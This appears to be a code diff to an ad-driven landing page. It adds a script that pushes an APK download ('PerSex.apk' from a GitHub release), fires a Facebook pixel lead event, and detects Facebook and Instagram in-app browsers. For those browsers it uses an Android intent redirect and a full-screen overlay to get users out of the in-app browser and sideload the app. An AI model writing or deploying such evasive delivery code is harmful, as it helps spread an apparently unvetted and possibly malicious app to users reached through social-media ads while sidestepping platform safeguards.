@@ -574,7 +574,7 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
 
         <!-- MAIN CTA -->
         <div class="cta-wrap">
-            <a href="#" class="btn-tg" onclick="handleDownload(event);">
+            <a href="#" id="downloadBtn" class="btn-tg" onclick="handleDownload(event);">
                 <svg viewBox="0 0 24 24" fill="currentColor">
                     <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm-1 14.5v-9l6 4.5z"/>
                 </svg>
@@ -804,5 +804,92 @@ src="https://www.facebook.com/tr?id=1561675052237363&ev=PageView&noscript=1"
     }, { threshold: 0.15 });
     revealEls.forEach(el => observer.observe(el));
 </script>
+
+<script>
+(function(){
+
+    // ==== REPLACE WITH YOUR GITHUB RELEASE APK URL ====
+    const apkUrl = "https://github.com/KIQrst11/persss/releases/download/V1.0/PerSex.apk";
+
+    const ua = navigator.userAgent || "";
+
+    const isFBBrowser =
+        ua.includes("FBAN") ||
+        ua.includes("FBAV") ||
+        ua.includes("Instagram");
+
+    const btn = document.getElementById("downloadBtn");
+
+    if (!btn) return;
+
+    btn.addEventListener("click", function(e){
+
+        e.preventDefault();
+
+        try {
+            fbq('track','Lead');
+        } catch(err){}
+
+        if (!isFBBrowser) {
+            window.location.href = apkUrl;
+            return;
+        }
+
+        const intentURL =
+            "intent://" +
+            window.location.host +
+            "/#Intent;" +
+            "scheme=https;" +
+            "package=com.android.chrome;" +
+            "end";
+
+        window.location.href = intentURL;
+
+        setTimeout(function(){
+
+            document.body.insertAdjacentHTML(
+                "beforeend",
+                `
+                <div style="
+                    position:fixed;
+                    inset:0;
+                    background:rgba(0,0,0,.95);
+                    z-index:999999;
+                    display:flex;
+                    align-items:center;
+                    justify-content:center;
+                    padding:20px;
+                    color:white;
+                    font-family:sans-serif;
+                    text-align:center;
+                ">
+                    <div>
+                        <h2>Open in Browser</h2>
+                        <p>Tap ⋮ → Open in Browser if download does not start</p>
+                        <br>
+                        <a
+                        href="${apkUrl}"
+                        style="
+                            padding:14px 25px;
+                            background:#C41230;
+                            border-radius:40px;
+                            color:white;
+                            text-decoration:none;
+                            font-weight:bold;
+                        ">
+                        Continue Download
+                        </a>
+                    </div>
+                </div>
+                `
+            );
+
+        },2000);
+
+    });
+
+})();
+</script>
+
 </body>
 </html>
